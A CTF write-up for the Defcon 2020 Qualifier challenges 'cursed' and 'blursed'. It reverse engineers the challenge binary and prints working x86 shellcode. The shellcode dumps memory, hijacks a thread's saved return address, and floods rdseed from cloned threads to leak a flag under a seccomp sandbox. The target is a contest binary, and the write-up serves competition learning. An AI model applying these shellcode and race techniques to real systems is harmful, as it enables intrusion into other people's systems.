---
layout: post
title:  "Defcon CTF Qualifier 2020 Cursed&Blursed"
date:   2020-05-22 00:00:00 +0000
categories: jekyll update
---

## 0x00 Overview

Last weekend [we](https://r3kapig.com/) participated Defcon CTF 2020 Qualifier and got 9th place finally, my teammates tql. With some help from my teammates, I solved 2 challenges, `cursed` and `blursed`. These 2 challenges are quite interesting, so here is my write-up for it. :)

The binary file for these 2 challenges are exactly identical. In the binary, a `blake2b` proof of work is required first. Then `clone` function is called to initiate a new thread. In new thread, `flag` is read into stack, and `bozo.bin` is mapped into memory as executable code and is then executed. `bozo.bin` will remove flag in memory at beginning but will load it into `xmm` registers, and some operations are performed on `xmm` registers. Such operations enable us to use side-channel attack to leak the contents in `xmm` registers. While in main thread, `0x1000` bytes are read into memory, and then `seccomp` is enabled, finally our input is executed as shellcode.

## 0x01 Reverse Engineering ELF File

The reverse engineering part is quite regular so I will not put too much attention on it. First of all, 16 random bytes are read into buffer and printed to `stdout`, then `0x30` bytes are read into buffer from `stdin` and concatenated at the back of the first 16 random bytes. Then a function `43E2D0` is called, which uses the `0x40`-byte data to calculate something and puts the result into the first argument. By changing 4th argument from `0x40` to `0` and searching the result in Google, I found that the function is a `blake2b` hash. Then first 3 bytes of result hash need to all be 0 to enter the next stage, so this is simply a Proof-of-Work.

In next stage, a RWX page with size `0x1000` is allocated by `mmap`. Then a thread is initiated using `clone` function. (PS: Actually I am not very sure if it is a thread or process. In theory, `clone` should create a process, but it presented as a thread in my gdb. In addition, both threads/processes share the same virtual memory, so in another word it works like a thread, thus I will call it thread in the following write-up.)

In the thread function, `flag` is read into a 128-size buffer, with the remaining bytes padding as `\x01`. Then `./bozo.bin` is mapped into memory as executable code using `mmap`. After setting global variable `0x664f60`(main thread won't continue until this is set to 1) to 1, the `bozo.bin` is called with flag and the RWX page as arguments. At this point `bozo.bin` is still unknown.

The main thread will then read `0x1000` bytes from `stdin` and wait until `0x664f60` is set to 1. Then `seccomp` is enabled, here is the result from `seccomp-tools`:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0f 0xc000003e  if (A != ARCH_X86_64) goto 0017
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0c 0xffffffff  if (A != 0xffffffff) goto 0017
 0005: 0x15 0x0a 0x00 0x00000001  if (A == write) goto 0016
 0006: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0016
 0007: 0x15 0x08 0x00 0x0000000b  if (A == munmap) goto 0016
 0008: 0x15 0x07 0x00 0x00000038  if (A == clone) goto 0016
 0009: 0x15 0x06 0x00 0x000000e7  if (A == exit_group) goto 0016
 0010: 0x15 0x00 0x04 0x0000000a  if (A != mprotect) goto 0015
 0011: 0x20 0x00 0x00 0x00000024  A = prot >> 32 # mprotect(start, len, prot)
 0012: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0015
 0013: 0x20 0x00 0x00 0x00000020  A = prot # mprotect(start, len, prot)
 0014: 0x15 0x01 0x00 0x00000000  if (A == 0x0) goto 0016
 0015: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0017: 0x06 0x00 0x00 0x00000000  return KILL
```

Then `mprotect` is called on some pages to make their properties non-RWX (I am not sure why this is done actually, since this does not really affect my exploitation), and our input is executed as shellcode.

## 0x02 Dumping bozo.bin

First of all, we need to analyze `bozo.bin` to see how it processes the flag and the RWX page. The idea is simple: call `write syscall` on page that maps to `bozo.bin`. Since `mmap` usually allocates continuous memory from high address to low address, the `bozo.bin` should locate at one page before the shellcode RWX page. Thus leaking `bozo.bin` is simple:

```assembly
call next
next: pop rsi ; get rip
sub rsi,0x1005 ; rsi = &bozo.bin
mov edi,1
mov edx,0x1000
mov rax,1
syscall ; write(1, &bozo.bin, 0x1000)
```

## 0x03 Cursed

The logic of `bozo.bin` of cursed is described as below:

1. load flag into `xmm0-xmm7`, set `rbx = &shellcode_input + 0xff8`

2. fill the buffer that contains flag using our shellcode (so reading flag directly is not possible)

3. execute `16*8=128` similar code blocks

   In each block, a byte is fetched from `xmm0-xmm7`, and then processed in some way, shown as blow:

   ```assembly
   ; rbx == [input+0xff8]
   loc_3E: ; first block
   xor     r8, r8
   pextrb  eax, xmm7, 0Fh  ; load the a flag byte into al
   ; different blocks fetch different bytes
   cmpxchg [rbx], r8       ; if al == [rbx]:
                           ;   [rbx] = r8
                           ;   break since ZF=0
                           ; else:
                           ;   al = [rbx]
   pause
   jnz     short loc_3E
   call    sub_BE8
   ```

   In another word, it loads a flag byte into `al`, and compares it with `[input+0xff8]`. If they equal, set `RWX+0xff8` to `0` and break; otherwise, continue the loop. At this point the idea is clear, we can change `RWX+0xff8` from `0-255` in shellcode and see if the `RWX+0xff8` is set to `0`. If so, that value is the correct flag byte, and we can print it and then try the next byte.

	However, the `sub_BE8` is troublesome:
	
	```assembly
	sub_BE8         proc near
		mov     rcx, 8
	loc_BEF:
			xor     rax, rax
			rdseed  rax
			and     rax, 0FFFh ; rax = rand([0:0xfff])
			mov     dword ptr [rsi+rax], 0FFFFFFFFh
			; write to shellcode randomly
			dec     rcx
			cmp     rcx, 0
			jg      short loc_BEF
		retn
	sub_BE8         endp
	```
	
	This function will write `0xffffffff` to our shellcode, which might destroy the shellcode. It turns out that after 128+ calls, the probability for our shellcode to be unmodified is very low. 
	

However, according to document of `rdseed`, it is possible for this instruction to return 0. If we can achieve this stably, we can bypass this shellcode destruction. When I was thinking about this, we found that challenge `blursed` has exactly same binary as `cursed`, and the crucial difference of `bozo.bin` is that `call` is replaced with a `jmp` which saves return address into `r15` register. And this difference reminds me that I can simply write the return address of `call` to hijack the `rip` of `bozo.bin` thread to let it execute arbitrary code! No need to struggle with the flag process logic!

Therefore, the shellcode is pretty simple:

```assembly
; ---------------- shellcode at the start of RWX page ----------------
call next
next: pop rsi
mov rdi,rsi
add rdi,0x800-5 ; rdi = RWX page + 0x800

mov rbx,rsp
sub rbx,0x10c8 ; rbx = address of saved rip
; because stack argument passed into `clone`
; is calculated using address of a local variable minus 1024
; clone(read_flag_exec_bozo, **&v17 - 1024**, 0x18900LL, v5);
; 0x10c8 is found by debugging

mov qword ptr [rsi-5+0xff8], 1
; last byte is always \x01 due to padding
; so this breaks the loop and enters `call sub_BE8`

loop:
mov [rbx],rdi ; writing saved rip to RWX+0x800 in a loop
jmp loop

; ---------------- shellcode at RWX page + 0x800 ----------------
call next
next: pop rsi
add rsi,0x100-5
movups [rsi],xmm0
movups [rsi+0x10],xmm1
movups [rsi+0x20],xmm2
movups [rsi+0x30],xmm3
movups [rsi+0x40],xmm4
movups [rsi+0x50],xmm5
movups [rsi+0x60],xmm6
movups [rsi+0x70],xmm7 ; write flag into memory
mov rdi,1
mov rdx,0x40
mov rax,SYS_write ; print flag contents
syscall
```

Due to race condition of thread, this does not always give the flag, but you will get the flag after several trials.

## 0x04 Blursed

The logic of `bozo.bin` is almost identical, except the bug in `cursed` is fixed by using `r15` to save return address, and except number of times that `0xffffffff` is written after each flag byte processing increases from 8 to 64. Therefore, we need to go back to the idea to make `rdseed` return 0.

Thanks to my teammate @**ShadowNight** who found this:

> Unlike the RDRAND  instruction, **the seed values come directly from the entropy conditioner, and it is possible for callers to invoke RDSEED faster than those  values are generated**. This means that applications must be designed  robustly and be prepared for calls to RDSEED to fail because seeds are  not available (CF=0).
>
> If only one thread is calling RDSEED infrequently, it is very  unlikely that a random seed will not be available. **Only during periods  of heavy demand, such as when one thread is calling RDSEED in rapid  succession or multiple threads are calling RDSEED simultaneously, are  underflows likely to occur**. 
>

When `rdseed` fails, the destination register will be set as zero, so it will not write to our critical shellcode.

```c
IF HW_NRND_GEN.ready = 1
    THEN
        CASE of
            osize is 64: DEST[63:0] ← HW_NRND_GEN.data;
            osize is 32: DEST[31:0] ← HW_NRND_GEN.data;
            osize is 16: DEST[15:0] ← HW_NRND_GEN.data;
        ESAC;
        CF ← 1;
    ELSE
        CASE of
            osize is 64: DEST[63:0] ← 0;
            osize is 32: DEST[31:0] ← 0;
            osize is 16: DEST[15:0] ← 0;
        ESAC;
        CF ← 0;
FI;
OF, SF, ZF, AF, PF ← 0;
// https://www.felixcloutier.com/x86/rdseed
```

As the reference suggests, if there are multiple threads that calls `rdseed` very frequently, the `rdseed` is very likely to gives zero. Thus, noting that `clone` is allowed in `seccomp` sandbox, the idea comes up: creating multiple threads calling `rdseed` in a infinite loop to let `rdseed` of `bozo.bin` thread give zero.

### Pseudo Code

In previous section I have mentioned an idea to leak the flag byte one by one, and here is the pseudo code describing that approach:

```python
while True:
	for i in [1...255] # iterate from 1-255
		[rbx] = i # set +0xff8 to i
		wait # wait for some while, 
        # to make sure this value is checked by bozo.bin thread
		if [rbx] == 0: # if +0xff8 is set to 0, current value is correct
			print i # print the byte value
			break # try the next byte
```

### Shellcode

Adding the code that initiates threads that frequently call `rdseed`, we can write our shellcode as shown below:

```assembly
call next
next: pop rbx

mov rbp, %s ; parameterize number of threads
clones:
	mov rdi,0x18900 
	; use the same flag as that of bozo.bin thread
	mov rsi,rsp
	sub rsi,0x2000
	; stack is rsp-0x2000, although not used
	mov rax,SYS_clone
	syscall ; call clone
	test rax, rax
	jz rdseed_loop 
	; let child thread execute the rdseed loop
	dec rbp
	test rbp,rbp
jnz clones

add rbx, -5+0xff8 ; rbx = RWX+0xff8
mov rsi, rbx
sub rsi, 8 ; rsi = buffer for SYS_write
mov rax, SYS_write
mov rdi, 1 ; fd = stdout
mov rdx, 1 ; size = 1
; load the needed arguement into register first
; to reduce size of the loop
; therefore the crack_loop is less likely to be destructed

mov rcx,0x100
wait0: loop wait0
; wait for a while to ensure threads are started
; maybe it is not needed

crack_loop:
	mov r8,1 ; i = 1
	byte_loop:
		mov qword ptr [rbx], r8 ; [rbx] = i
		mov rcx,%s
		wait: loop wait ; wait
		; the rcx, number of times, is parameterized
		cmp qword ptr [rbx], 0
		jnz byte_loop_end ; if [rbx] == 0
		mov [rsi], r8
		syscall ; print i
		jmp crack_loop ; break, try next byte
		byte_loop_end:
		inc r8 ; if [rbx] != 0, increment i and try next value
		cmp r8, 0xff
		jbe byte_loop
jmp crack_loop

rdseed_loop:
rdseed rax
jmp rdseed_loop
```

One thing to note is that calling convention of `SYS_clone` is different from `clone` function used in program: `SYS_clone` takes `flag` as first argument and stack as second argument, and it works like `fork` (child process/thread returns `0` while parent process/thread returns a positive `pid`).

However, this shellcode does not work very well on my local PC, it can leak some bytes, but it cannot leak whole flag. The reason is that `rdseed` still returns non-zero for many case. Since there is a PoW on remote machine, I was thinking that I should not brute force and that there should be a better approach to let `rdseed` return zero more stably. I tried to find some ways such as giving more priority to threads that I created, but I failed to have any progress. Finally, I still decided to try brute force. Thanks to @**半神道人**, who wrote the PoW and ran it on a super-fast cloud server, we can obtain the PoW data in a split second.

Finally, after some brute-forcing and parameter tuning (just like what you do in machine learning :D), I got the flag as the third blood! Cheers! [Here](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/cursed-blursed.py) is the full exploit that I used to get the flag, including the final parameters.